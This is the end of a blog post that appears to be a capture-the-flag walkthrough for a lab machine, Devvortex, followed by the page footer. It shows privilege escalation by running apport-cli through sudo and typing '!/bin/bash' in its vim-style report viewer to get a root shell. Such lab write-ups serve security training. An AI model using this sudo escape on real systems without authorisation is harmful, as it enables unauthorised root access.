                        into a file instead of reporting it. This file can
                        <span class="k">then </span>be reported later on from a different machine.
  <span class="nt">--tag</span><span class="o">=</span>TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  <span class="nt">-v</span>, <span class="nt">--version</span>         Print the Apport version number.

</code></pre></div></div> <p>With <code class="language-plaintext highlighter-rouge">sudo /usr/bin/apport-cli -f</code> the utility enters the <strong>File a bug</strong> mode to first attempt submitting a bug to understand how the utility works.</p> <p>At the end, of the submission is an option to view the report.</p> <p><img src="/assets/img/20240115-devvortext-apportuse.png" alt="20240115-devvortext-apportuse.png" class="auto-resize"></p> <p>The screen that follows opens in a <code class="language-plaintext highlighter-rouge">vim</code> style editor.</p> <p><img src="/assets/img/20240115-devvortext-apportshell.png" alt="20240115-devvortext-apportshell.png" class="auto-resize"></p> <p>Passing a shell to it by typing <code class="language-plaintext highlighter-rouge">!/bin/bash</code> may, theoretically, launch a new shell under the sudo privileges from which the utility is being ran.</p> <p>and it does!</p> <p><img src="/assets/img/20240115-devvortext-rootflag.png" alt="20240115-devvortext-rootflag.png" class="auto-resize"></p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/hospital-walkthrough/">Hospital</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/codify-walkthrough/">Codify</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/bizness-walkthrough/">Bizness</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/pilgrimage-write-up/">Pilgrimage</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/essential-eight-application-control/">Application Control</a> </li> </div> </div> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2024 . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?7b30caa5023af4af8408a472dc4e1ebb"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script defer src="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.js"></script> <script src="/assets/js/no_defer.js?d633890033921b33e0ceb13d22340a9c"></script> <script defer src="/assets/js/common.js?acdb9690d7641b2f8d40529018c71a01"></script> <script defer src="/assets/js/copy_code.js?c9d9dd48933de3831b3ee5ec9c209cac" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){window.dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>